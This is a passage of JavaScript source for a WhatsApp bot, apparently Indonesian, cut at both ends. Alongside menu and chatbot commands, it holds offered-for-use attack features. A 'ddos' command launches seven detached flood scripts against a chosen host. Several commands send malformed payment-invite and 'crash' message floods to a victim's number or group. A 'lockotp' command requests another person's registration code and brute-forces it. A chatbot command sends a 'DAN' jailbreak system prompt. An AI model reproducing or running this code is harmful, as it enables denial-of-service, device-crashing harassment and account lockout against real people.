            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 }else if (args[0] === 'group') {
await sleep(100)
    
 const caption = `${menugroup(prefix)}`;
zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 }else if (args[0] === 'search') {
await sleep(100)
    
 const caption = `${menusearch(prefix)}`;

zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 }else if (args[0] === 'virus') {
await sleep(100)
    
 const caption = `${menuvirus(prefix)}`;

zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 } else if (args[0] === 'tools') {
await sleep(100)
    
 const caption = `${menutools(prefix)}`;

zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 } else if (args[0] === 'ddos') {
await sleep(100)
    
 const caption = `${menuddos(prefix)}`;

zynX.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
            fileName: `Zʏɴxᴢᴏ`,
            mimetype: "application/pdf",
            fileLength: 00000111,
            pageCount: 2024,
caption: caption,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
	 newsletterName: saluran,
 newsletterJid: idsal,
footer: proto.Message.InteractiveMessage.Footer.create({
 text: wm
 }),
		},
		externalAdReply: {  
title: `${time}`, 
body: `Zʏɴxᴢᴏ`,
thumbnail: thumb,
sourceUrl: 'https://whatsapp.com/channel/0029ValRq0ULikgDaQ5Y0c0L', 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: floc})
 }

break

case 'ddos': {
    if (!isPrem) return reply(mess.premium)
    const [url, hostname, duration] = args;
    const username = 'root';
    const port = '22';
    
    if (args.length === 3 && url && hostname && duration) {
        m.reply(`\`\`\`[🔍] Sucess Menyerang Website: ${hostname}, Website akan eror dalam waktu ${duration} detik.\`\`\``);

    const command1 = spawn('node', [`./lib/ddos/Raw.js`, `http://${hostname}`, `${duration}`], { detached: true, stdio: 'ignore' });
    const command2 = spawn('node', ['./lib/ddos/SSH.js', `${hostname}`, `${port}`, `${username}`, `${duration}`], { detached: true, stdio: 'ignore' });
    const command3 = spawn('node', [`./lib/ddos/Ninja.js`, `${url}`, `${duration}`], { detached: true, stdio: 'ignore' });
    const command4 = spawn('node', [`./lib/ddos/Tls.js`, `${url}`, `${duration}`, `100 4`], { detached: true, stdio: 'ignore' });
    const command5 = spawn('node', [`./lib/ddos/Mix.js`, `${url}`, `${duration}`, `100 4`, `proxy.txt`], { detached: true, stdio: 'ignore' });
    const command6 = spawn('node', [`./lib/ddos/Kill.js`, `${url}`, `${duration}`, `100 4`], { detached: true, stdio: 'ignore' });
    const command7 = spawn('node', [`./lib/ddos/Raw.js`, `${url}`, `${duration}`], { detached: true, stdio: 'ignore' });
    
    command1.unref();
    command2.unref();
    command3.unref();
    command4.unref();
    command5.unref();
    command6.unref();
    command7.unref();
        
    } else {
        m.reply(`*Format Salah*
        .${command} <url> <ip> <duration>`)
    }
}
break;

case "viospc" : case "infinity" : case "killandro" : case "paktzy" : {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return setReply(`Nomor Target`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@s.whatsapp.net"
a = await zynX.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zynX.sendMessage(Pe, {text: `${pvz3}`}, {quoted:m})
await sleep(100)
sendPaymentInfoMessage(Pe)
await sleep(100)
zynX.sendMessage(Pe, {text: `${buttontzy}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${pvm3}`}, {quoted:m})
await sleep(100)
sendPaymentInfoMessage(Pe)
await sleep(100)
zynX.sendMessage(Pe, {text: `${funer}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${pv3m}`}, {quoted:m})
await sleep(100)
sendPaymentInfoMessage(Pe)
await sleep(100)
zynX.sendMessage(Pe, {text: `${lugia}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:m})
await sleep(100)
sendPaymentInfoMessage(Pe)
await sleep(100)
zynX.sendMessage(Pe, {text: `${explosion}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${pvz3}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${pvm3}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${buttontzy}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${pv3m}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${buttontzy}`}, {quoted:m})
await sleep(100)
sendPaymentInfoMessage(Pe)
await sleep(100)
zynX.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${explosion}`}, {quoted:m})
await sleep(100)
}
break

case "zyngc+" : {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return setReply(`Id Gc`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zynX.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zynX.sendMessage(Pe, {text: `${pvz3}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${buttontzy}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${funer}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${buttontzy}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${lugia}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${explosion}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${parando}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${killed}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${cova}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${sumiu}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${destroi}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${voids}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${explosionios}`}, {quoted:m})
await sleep(100)
}
break
case "zyngc" : {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return setReply(`Id Gc`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zynX.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zynX.sendMessage(Pe, {text: `${pvz3}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${pvm3}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${funer}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${pv3m}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${lugia}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${malvadinha}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${explosion}`}, {quoted:m})
await sleep(100)
}
break
case "xzyngc" : {
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return setReply(`Id Gc`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,"")+"@g.us"
a = await zynX.sendMessage(m.chat, {react: { text: "🥶", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
zynX.sendMessage(Pe, {text: `${parando}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${killed}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${cova}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${sumiu}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${destroi}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${voids}`}, {quoted:m})
await sleep(100)
zynX.sendMessage(Pe, {text: `${explosionios}`}, {quoted:m})
await sleep(100)
}
break

case 'zero': 
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(responbug)
for (let j = 0; j < 3; j++) {
await bakdok(Pe, poke)
await ngeloc(Pe, poke)
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await ngeloc(Pe, poke)
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await bakdok(Pe, poke)
await ngeloc(Pe, poke)
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await bakdok(Pe, poke)
await ngeloc(Pe, poke)
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await ngeloc(Pe, poke)
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(500)
await sendSystemCrashMessage(Pe)
await bakdok(Pe, poke)
await sendSystemCrashMessage(Pe)
await sendPaymentInfoMessage(Pe, poke)
await bugHO(Pe)
await crashX(Pe)
await zyninvsible(Pe)
sleep(500)
await sendSystemCrashMessage(Pe)
sleep(500)
}
reply(`\`Berhasil Mengirim Bug WhatsApp\`\n\n> Type Bug: Crashh> Target: ${Pe}\n\n> _Perlu diperhatikan, jika target menggunakan whatsapp versi beta, maka target tidak akan ceklis 1 namun target akan tetap mengalami crash ☠️_`)
break

case 'zynz': case 'zets': 
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(responbug)
for (let j = 0; j < 2; j++) {
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(1000)
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(1000)
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: Pe } })
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000}},{})
await zynX.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 86400000000}},{ participant: { jid: Pe } })
sleep(1000)
}
reply(`⌜ *Berhasil Mengirim Bug WhatsApp* ⌟\n\n> Type Bug: Crashh> Target: ${Pe}\n\n> _Perlu diperhatikan, jika target menggunakan whatsapp versi beta, maka target tidak akan ceklis 1 namun target akan tetap mengalami crash ☠️_`)
break

case 'xkill': case 'vip': case 'attack': 
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(responbug)
for (let j = 0; j < 3; j++) {
await sendSystemCrashMessage(Pe)
await sendPaymentInfoMessage(Pe, poke)
await bugHO(Pe, poke)
await crashX(Pe, poke)
await zyninvsible(Pe, poke)
await bakdok(Pe, poke)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, poke)
sleep(500)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await bugHO(Pe)
await crashX(Pe)
await zyninvsible(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await sendSystemCrashMessage(Pe)
await bakdok(Pe, poke)
await sendSystemCrashMessage(Pe)
await sendPaymentInfoMessage(Pe, poke)
await bugHO(Pe)
await crashX(Pe)
await zyninvsible(Pe)
sleep(500)
}
reply(`⌜ *Berhasil Mengirim Bug WhatsApp* ⌟\n\n> Type Bug: Crashh> Target: ${Pe}\n\n> _Perlu diperhatikan, jika target menggunakan whatsapp versi beta, maka target tidak akan ceklis 1 namun target akan tetap mengalami crash ☠️_`)
break

case 'zetsub': case 'blank': 
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Contoh:\n ${prefix + command} 628xxx`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(responbug)
for (let j = 0; j < 2; j++) {
await sendSystemCrashMessage(Pe)
await sendPaymentInfoMessage(Pe, poke)
await bugHO(Pe, poke)
await crashX(Pe, poke)
await zyninvsible(Pe, poke)
await bakdok(Pe, poke)
await sendSystemCrashMessage(Pe)
await ngeloc(Pe, poke)
sleep(500)
await sendSystemCrashMessage(Pe)
await ListMSGVIP4(Pe)
await bugHO(Pe)
await crashX(Pe)
await zyninvsible(Pe)
await LiveLocVIP(Pe)
await ListMSGVIP3(Pe)
await ListMSGVIP2(Pe)
await sendSystemCrashMessage(Pe)
await bakdok(Pe, poke)
await sendSystemCrashMessage(Pe)
await sendPaymentInfoMessage(Pe, poke)
await bugHO(Pe)
await crashX(Pe)
await zyninvsible(Pe)
sleep(500)
}
reply(`⌜ *Berhasil Mengirim Bug WhatsApp* ⌟\n\n> Type Bug: Crashh> Target: ${Pe}\n\n> _Perlu diperhatikan, jika target menggunakan whatsapp versi beta, maka target tidak akan ceklis 1 namun target akan tetap mengalami crash ☠️_`)
break

case "vpay": case "zerobug":  case "zap": case "loxas": case "bugcomunity": case "convite": case "rosapay": case "convite-nova": case "crashgp": case "locimg": 
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx,5`)
number = q.split(',')[0];
amount = q.split(',')[1] * 5;
Pe = number.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
respondonebug = `⌜ *Berhasil Mengirim Bug WhatsApp* ⌟\n\n> Type Bug: Crashh> Target: ${Pe}\n\n> _Perlu diperhatikan, jika target menggunakan whatsapp versi beta, maka target tidak akan ceklis 1 namun target akan tetap mengalami crash ☠️_`
zynzcrash(Pe, amount)
reply(respondonebug)
break

case 'x': 
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx,5`)
    
    number = q.split(',')[0];
    amount = q.split(',')[1] * 5;
    targetfull = number.replace(/[^0-9]/g,'')
    Pe = `${targetfull},${amount}`
    
    let teksnya = "Silahkan pilih list bug menu yang ada dibawah ini"

let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
newsletterName: "Zʏɴxᴢᴏ",
newsletterJid: "@newsletter"
},
externalAdReply: {
showAdAttribution: true
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teksnya
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify({
"title": "Select Virus",
"sections": [{
"title": "# Silahkan Pilih Salah Satu Di Bawah Ini",
"highlight_label": "",
"rows": [
{ "header": "Type Android", "title": "Send Virus", "id": `.vpay ${Pe}` },
{ "header": "Type Iphone", "title": "Send Virus", "id": `.iphone ${Pe}` },
{ "header": "Type Beta", "title": "Send Virus", "id": `.zap ${Pe}` },
{ "header": "Type Ori", "title": "Send Virus", "id": `.zerobug ${Pe}` }
]
}]
})
}]
})
})
}
}
}, { quoted: m });    
zynX.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
});
break;

case 'openai': case 'chatgpt': case 'ai':{
if (!isPrem && global.db.data.users[sender].limit < 1) return reply(mess.limit) 
if(!q) return reply(`Teksnya?\nExample: ${prefix+command} apa itu rumah`)		
reply(mess.wait)	
let messages = [
{ 
role: 'user',
content: `${q}`
}]
let p =  (await axios.post(`https://skizo.tech/api/openai?apikey=lanagalau`, { messages, system: 'you as DAN , a large ai build with integer' })).data
reply(p.result)
}
db.data.users[sender].limit -= 1 // -1 limit
break

case 'lockotp': {
if (!isPrem) return reply(mess.premium)
  if (args.length < 1) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 62|871717171`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 62|71717171`);
  const zynXCountry = args2[0];
  const zynXTarget = args2[1];
  const zynXNumber = zynXTarget.replace('@s.whatsapp.net', '');
  const zynXmerge = `${zynXCountry}${zynXTarget}`
  reply(`Sukses mengirimkan ${command} dinomor ${zynXNumber}`)
  try {
    const { statezynX, saveCredszynX } = await useMultiFileAuthState(global.sessionName);
    const zynXRequest = await zynX.requestRegistrationCode({
      phoneNumber: '+' + zynXCountry + `${zynXTarget}`,
      phoneNumberCountryCode: zynXCountry,
      phoneNumberNationalNumber: `${zynXNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var zynXPrefix = Math.floor(Math.random() * 999);
      var zynXSuffix = Math.floor(Math.random() * 999);
      await zynX.register(`${zynXPrefix}-${zynXSuffix}`);
    } catch (err) {
      console.log(`${zynXPrefix}-${zynXSuffix}`);
      await sleep(100000)
    }
  }
}
break;

case  'miku':
if (!q) return reply(`masukan teks`)
//if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
const mikubeban = await fetchJson(`https://api-charaai.vercel.app/charaai?chara=Miku&text=${q}`)
zynX.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${week} , ${calender}`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thanumbnail: fs.readFileSync('./stik/reply.jpg'),sourceUrl: `${sig}`,}
}, text: mikubeban}, { quoted: m })
break
case  'luffy':
if (!q) return reply(`mau nanya apa`)
//if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
const luffybeban = await fetchJson(`https://api-charaai.vercel.app/charaai?chara=Luffy&text=${q}`)
zynX.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${week} , ${calender}`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thanumbnail: fs.readFileSync('./stik/thumb.jpeg'),sourceUrl: `${sgc}`,}
}, text: luffybeban}, { quoted: m })
break

case  'robin':
if (!q) return reply(`mau nanya apa`)
//if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
const robinbeban = await fetchJson(`https://api-charaai.vercel.app/charaai?chara=Robin&text=${q}`)
zynX.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${week} , ${calender}`,body:`⌜ ${ucapanWaktu} ⌟`,previewType:"PHOTO",thanumbnail: fs.readFileSync('./stik/thumb.jpeg'),sourceUrl: `${sig}`,}
}, text: robinbeban}, { quoted: m })
break

case 'text2img': {
  if (isBan) return reply(mess.bann)
  if (!text) return reply(`Example: ${prefix + command} Cat`)
  // Check if the version is between 1 and 7
  const versionRegex = /^v[1-7]$/;
  if (args[0] && versionRegex.test(args[0])) {
    reply(mess.wait)
    let cap = `${mess.success}`
    let imgg;

    switch (args[0]) {
      case 'v1':
        imgg = `https://aemt.me/ai/text2img?text=${text}`;
        break;
      case 'v2':
        imgg = `https://aemt.me/v1/text2img?text=${text}`;
        break;
      case 'v3':
        imgg = `https://aemt.me/v2/text2img?text=${text}`;
        break;
      case 'v4':
        imgg = `https://aemt.me/v3/text2img?text=${text}`;
        break;
      case 'v5':
        imgg = `https://aemt.me/v4/text2img?text=${text}`;
        break;
      case 'v6':
        imgg = `https://aemt.me/v5/text2img?text=${text}`;
        break;
      case 'v7':
        imgg = `https://aemt.me/v6/text2img?text=${text}`;
        break;
    }

    zynX.sendMessage(from, { image: { url: imgg }, caption: cap }, { quoted: m });
    return;
  }

  let sections = [
    {
      title: 'Text To Image',
      rows: [
        { title: 'Version 1', description: `Text To Image Version 1`, id: `${prefix}text2img v1 ${text}` },
        { title: 'Version 2', description: `Text To Image Version 2`, id: `${prefix}text2img v2 ${text}` },
        { title: 'Version 3', description: `Text To Image Version 3`, id: `${prefix}text2img v3 ${text}` },
        { title: 'Version 4', description: `Text To Image Version 4`, id: `${prefix}text2img v4 ${text}` },
        { title: 'Version 5', description: `Text To Image Version 5`, id: `${prefix}text2img v5 ${text}` },
        { title: 'Version 6', description: `Text To Image Version 6`, id: `${prefix}text2img v6 ${text}` },
        { title: 'Version 7', description: `Text To Image Version 7`, id: `${prefix}text2img v7 ${text}` },
      ]
    }
  ];

  let listMessage = {
    title: 'List Menu',
    sections
  };

  let msg = generateWAMessageFromContent(from, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Silahkan pilih *option* di bawah ini`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: wm
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: ``,
            gifPlayback: true,
            subtitle: ownername,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": JSON.stringify(listMessage)
              }
            ],
          }),
          contextInfo: {
            mentionedJid: [m.sender],
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterName: saluran,
              newsletterJid: idsal,
              serverMessageId: 143
            }
          }
        })
      }
    }
  }, {});

  await zynX.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  });
}
break

case 'openai':
case 'gpt4':{
if (!text) return reply(`Example : ${command} Halo ai`)
